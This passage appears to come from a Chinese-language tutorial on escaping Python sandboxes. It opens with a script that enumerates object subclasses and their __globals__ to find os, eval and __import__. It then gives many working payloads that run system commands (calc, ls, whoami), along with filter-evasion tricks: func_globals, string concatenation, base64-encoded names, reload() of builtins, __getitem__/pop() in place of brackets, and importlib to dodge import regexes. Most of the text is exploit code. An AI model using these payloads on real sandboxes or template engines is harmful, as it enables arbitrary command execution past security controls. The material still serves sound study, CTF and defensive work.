                'calendar': ['sys', '__builtins__'], 'cgi': ['os', 'sys', '__builtins__'],
                'cgitb': ['os', 'sys', '__builtins__'], 'chunk': ['__builtins__'], 'cmd': ['sys', '__builtins__'],
                'code': ['sys', '__builtins__'], 'codecs': ['sys', '__builtins__', 'open'], 'codeop': ['__builtins__'],
                'colorsys': ['__builtins__'], 'compileall': ['os', 'importlib', 'sys', '__builtins__'],
                'configparser': ['os', 'sys', '__builtins__'], 'contextlib': ['sys', '__builtins__'],
                'copy': ['__builtins__'], 'copyreg': ['__builtins__'], 'crypt': ['__builtins__'],
                'csv': ['__builtins__'], 'datetime': ['__builtins__'], 'decimal': ['__builtins__'],
                'difflib': ['__builtins__'], 'dis': ['sys', '__builtins__'], 'doctest': ['os', 'sys', '__builtins__'],
                'dummy_threading': ['__builtins__'], 'enum': ['sys', '__builtins__'], 'filecmp': ['os', '__builtins__'],
                'fileinput': ['os', 'sys', '__builtins__'], 'fnmatch': ['os', '__builtins__'],
                'formatter': ['sys', '__builtins__'], 'fractions': ['sys', '__builtins__'],
                'ftplib': ['sys', '__builtins__'], 'functools': ['__builtins__'], 'genericpath': ['os', '__builtins__'],
                'getopt': ['os', '__builtins__'], 'getpass': ['os', 'sys', '__builtins__'],
                'gettext': ['os', 'sys', '__builtins__'], 'glob': ['os', '__builtins__'],
                'gzip': ['os', 'sys', '__builtins__', 'open'], 'hashlib': ['__builtins__'], 'heapq': ['__builtins__'],
                'hmac': ['__builtins__'], 'imaplib': ['subprocess', 'sys', '__builtins__'], 'imghdr': ['__builtins__'],
                'imp': ['os', 'importlib', 'sys', '__builtins__'],
                'inspect': ['os', 'importlib', 'sys', '__builtins__'], 'io': ['__builtins__', 'open'],
                'ipaddress': ['__builtins__'], 'keyword': ['__builtins__'], 'linecache': ['os', 'sys', '__builtins__'],
                'locale': ['sys', '__builtins__'], 'lzma': ['os', '__builtins__', 'open'],
                'macpath': ['os', '__builtins__'], 'macurl2path': ['os', '__builtins__'],
                'mailbox': ['os', '__builtins__'], 'mailcap': ['os', '__builtins__'],
                'mimetypes': ['os', 'sys', '__builtins__'], 'modulefinder': ['os', 'importlib', 'sys', '__builtins__'],
                'netrc': ['os', '__builtins__'], 'nntplib': ['__builtins__'], 'ntpath': ['os', 'sys', '__builtins__'],
                'nturl2path': ['__builtins__'], 'numbers': ['__builtins__'], 'opcode': ['__builtins__'],
                'operator': ['__builtins__'], 'optparse': ['os', 'sys', '__builtins__'],
                'os': ['sys', '__builtins__', 'open'], 'pathlib': ['os', 'sys', '__builtins__'],
                'pdb': ['os', 'sys', '__builtins__'], 'pickle': ['codecs', 'sys', '__builtins__'],
                'pickletools': ['codecs', 'sys', '__builtins__'], 'pipes': ['os', '__builtins__'],
                'pkgutil': ['os', 'importlib', 'sys', '__builtins__'],
                'platform': ['os', 'platform', 'subprocess', 'sys', '__builtins__'],
                'plistlib': ['os', 'codecs', '__builtins__'], 'poplib': ['__builtins__'],
                'posixpath': ['os', 'sys', '__builtins__'], 'pprint': ['__builtins__'],
                'profile': ['os', 'sys', '__builtins__'], 'pstats': ['os', 'sys', '__builtins__'],
                'pty': ['os', 'sys', '__builtins__'],
                'py_compile': ['os', 'importlib', 'sys', '__builtins__', 'compile'],
                'pyclbr': ['importlib', 'sys', '__builtins__'],
                'pydoc': ['os', 'platform', 'importlib', 'sys', '__builtins__'], 'queue': ['__builtins__'],
                'quopri': ['__builtins__'], 'random': ['__builtins__'], 're': ['__builtins__', 'compile'],
                'reprlib': ['__builtins__'], 'rlcompleter': ['__builtins__'],
                'runpy': ['importlib', 'sys', '__builtins__'], 'sched': ['__builtins__'],
                'secrets': ['os', '__builtins__'], 'selectors': ['sys', '__builtins__'],
                'shelve': ['__builtins__', 'open'], 'shlex': ['os', 'sys', '__builtins__'],
                'shutil': ['os', 'sys', '__builtins__'], 'signal': ['__builtins__'],
                'site': ['os', 'sys', '__builtins__'], 'smtpd': ['os', 'sys', '__builtins__'],
                'smtplib': ['sys', '__builtins__'], 'sndhdr': ['__builtins__'], 'socket': ['os', 'sys', '__builtins__'],
                'socketserver': ['os', 'sys', '__builtins__'], 'sre_compile': ['__builtins__', 'compile'],
                'sre_constants': ['__builtins__'], 'sre_parse': ['__builtins__'], 'ssl': ['os', 'sys', '__builtins__'],
                'stat': ['__builtins__'], 'statistics': ['__builtins__'], 'string': ['__builtins__'],
                'stringprep': ['__builtins__'], 'struct': ['__builtins__'], 'subprocess': ['os', 'sys', '__builtins__'],
                'sunau': ['__builtins__', 'open'], 'symbol': ['__builtins__'], 'symtable': ['__builtins__'],
                'sysconfig': ['os', 'sys', '__builtins__'], 'tabnanny': ['os', 'sys', '__builtins__'],
                'tarfile': ['os', 'sys', '__builtins__', 'open'], 'telnetlib': ['sys', '__builtins__'],
                'tempfile': ['__builtins__'], 'textwrap': ['__builtins__'], 'this': ['__builtins__'],
                'threading': ['__builtins__'], 'timeit': ['timeit', 'sys', '__builtins__'], 'token': ['__builtins__'],
                'tokenize': ['sys', '__builtins__', 'open'], 'trace': ['os', 'sys', '__builtins__'],
                'traceback': ['sys', '__builtins__'], 'tracemalloc': ['os', '__builtins__'],
                'tty': ['os', '__builtins__'], 'turtle': ['sys', '__builtins__'], 'types': ['__builtins__'],
                'typing': ['sys', '__builtins__'], 'uu': ['os', 'sys', '__builtins__'],
                'uuid': ['os', 'sys', '__builtins__'], 'warnings': ['sys', '__builtins__'],
                'wave': ['sys', '__builtins__', 'open'], 'weakref': ['sys', '__builtins__'],
                'webbrowser': ['os', 'subprocess', 'sys', '__builtins__', 'open'], 'xdrlib': ['__builtins__'],
                'zipapp': ['os', 'sys', '__builtins__'], 'zipfile': ['os', 'importlib', 'sys', '__builtins__']}
target_modules = ['os', 'platform', 'subprocess', 'timeit', 'importlib', 'codecs', 'sys']
target_functions = ['__import__', '__builtins__', 'exec', 'eval', 'execfile', 'compile', 'file', 'open']
all_targets = list(set(list(find_modules.keys()) + target_modules + target_functions))
all_modules = list(set(list(find_modules.keys()) + target_modules))
subclasses = ().__class__.__bases__[0].__subclasses__()
sub_name = [s.__name__ for s in subclasses]
# 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40]('./test.py').read()
print('----------1-----------')
for i, s in enumerate(sub_name):
    for f in all_targets:
        if f == s:
            if f in target_functions:
                print(i, f)
            elif f in all_modules:
                target = find_modules[f]
                sub_dict = subclasses[i].__dict__
                for t in target:
                    if t in sub_dict:
                        print(i, f, target)
print('----------2-----------')
# 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')
for i, sub in enumerate(subclasses):
    try:
        more = sub.__init__.__globals__
        for m in all_targets:
            if m in more:
                print(i, sub, m, find_modules.get(m))
    except Exception as e:
        pass
print('----------3-----------')
# 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.values()[13]['eval']('__import__("os").system("ls")')
for i, sub in enumerate(subclasses):
    try:
        more = sub.__init__.__globals__.values()
        for j, v in enumerate(more):
            for f in all_targets:
                try:
                    if f in v:
                        if f in target_functions:
                            print(i, j, sub, f)
                        elif f in all_modules:
                            target = find_modules.get(f)
                            sub_dict = v[f].__dict__
                            for t in target:
                                if t in sub_dict:
                                    print(i, j, sub, f, target)
                except Exception as e:
                    pass
    except Exception as e:
        pass
print('----------4-----------')
# 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']("os").system("ls")
# <class 'warnings.catch_warnings'>类很特殊，在内部定义了_module=sys.modules['warnings']，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似
for i, sub in enumerate(subclasses):
    try:
        more = sub()._module.__builtins__
        for f in all_targets:
            if f in more:
                print(i, f)
    except Exception as e:
        pass


```

过滤`__globals__`
---------------

当`__globals__`被禁用时，

*   可以用 func_globals 直接替换；
*   使用`__getattribute__('__globa'+'ls__')`

```
# 原型是调用__globals__
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('calc')

# 如果过滤了__globals__，可直接替换为func_globals
''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals['__builtins__']['__import__']('os').system('calc')
# 也可以通过拼接字符串得到方式绕过
''.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__("__glo"+"bals__")['__builtins__']['__import__']('os').system('calc')


```

base64 编码
---------

对关键字进行 base64 编码可绕过一些明文检测机制：

```
>>> import base64
>>> base64.b64encode('__import__')
'X19pbXBvcnRfXw=='
>>> base64.b64encode('os')
'b3M='
>>> __builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64')).system('calc')
0


```

reload() 方法
-----------

某些情况下，通过 del 将一些模块的某些方法给删除掉了，但是我们可以通过 reload() 函数重新加载该模块，从而可以调用删除掉的可利用的方法：

```
>>> __builtins__.__dict__['eval']
<built-in function eval>
>>> del __builtins__.__dict__['eval']
>>> __builtins__.__dict__['eval']
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
KeyError: 'eval'
>>> reload(__builtins__)
<module '__builtin__' (built-in)>
>>> __builtins__.__dict__['eval']
<built-in function eval


```

字符串拼接
-----

凡是以字符串形式作为参数的都可以使用拼接的形式来绕过特定关键字的检测。

```
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__bu'+'iltins__']['__impor'+'t__']('o'+'s').system('ca'+'lc')

```

过滤中括号
-----

当中括号 [] 被过滤掉时，

*   调用`__getitem__()`函数直接替换；
*   调用 pop() 函数（用于移除列表中的一个元素，默认最后一个元素，并且返回该元素的值）替换；

```
# 原型
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('calc')

# __getitem__()替换中括号[]
''.__class__.__mro__.__getitem__(2).__subclasses__().__getitem__(59).__init__.__globals__.__getitem__('__builtins__').__getitem__('__import__')('os').system('calc')

# pop()替换中括号[]，结合__getitem__()利用
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.__globals__.pop('__builtins__').pop('__import__')('os').system('calc')


```

import 限制与绕过
------------

import 导入  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210421204736-bff17360-a29f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210421204736-bff17360-a29f-1.png)  
所以说如果导入的模块 a 中有着另一个模块 b，那么，我们可以用 a.b 的方法或者`a.__dict__[b<name>]`的方法间接访问模块 b

例子 1

```
import re,sys
pattern  = re.compile('import\s+(os|subprocess)')
match = re.search(pattern,sys.args[1])
if match:
    print "forbidden module import detected"
    raise Exception


```

要执行 shell 命令, 必须引入 os/commands/subprocess 这几个包,  
对于攻击者来说, 改如何绕过呢,

必须使用其他的引入方式

```
__import__函数 #动态加载类和函数
importlib库

```

`__import__`函数

```
test = __import__("os")
print test.system('whoami')


```

importlib 库

```
import importlib
test= importlib.import_module("os")
print(test.system("whoami"))


```

参考文章：  
[https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/](https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/)  
[https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/](https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/)